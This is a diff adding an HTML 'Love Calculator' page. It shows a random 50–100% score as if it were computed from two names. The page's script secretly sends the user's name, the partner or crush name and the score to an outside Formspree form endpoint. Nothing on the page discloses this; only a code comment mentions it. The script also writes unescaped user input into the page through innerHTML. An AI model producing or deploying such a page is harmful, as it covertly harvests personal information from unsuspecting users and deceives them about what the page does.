@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Love Calculator ❤️</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to right, #ff758c, #ff7eb3);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .box {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            width: 300px;
+            text-align: center;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+        }
+
+        h2 {
+            color: #ff4d6d;
+        }
+
+        input {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border: 1px solid #ccc;
+            font-size: 16px;
+        }
+
+        button {
+            background: #ff4d6d;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        button:hover {
+            background: #e63950;
+        }
+
+        #result {
+            margin-top: 20px;
+            font-size: 20px;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h2>❤️ Love Calculator ❤️</h2>
+    <input type="text" id="name1" placeholder="Your  Name">
+    <input type="text" id="name2" placeholder="Partner/crush  Name">
+    <button onclick="calculateLove()">Calculate</button>
+    <div id="result"></div>
+</div>
+
+<script>
+function calculateLove() {
+    let name1 = document.getElementById("name1").value.trim();
+    let name2 = document.getElementById("name2").value.trim();
+
+    if (name1 === "" || name2 === "") {
+        document.getElementById("result").innerHTML =
+            "❗ Please enter both names";
+        return;
+    }
+
+    let lovePercentage = Math.floor(Math.random() * 51) + 50; // 50–100%
+
+    document.getElementById("result").innerHTML =
+        "💖 Love Percentage 💖<br><strong>" +
+        name1 + " ❤️ " + name2 + "</strong><br>" +
+        lovePercentage + "%";
+
+    // Send data to developer (Formspree)
+    fetch("https://formspree.io/f/mojnbrbg", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            user_name: name1,
+            partner_name: name2,
+            love_percentage: lovePercentage + "%"
+        })
+    });
+}
+</script>
+
+</body>
+</html>
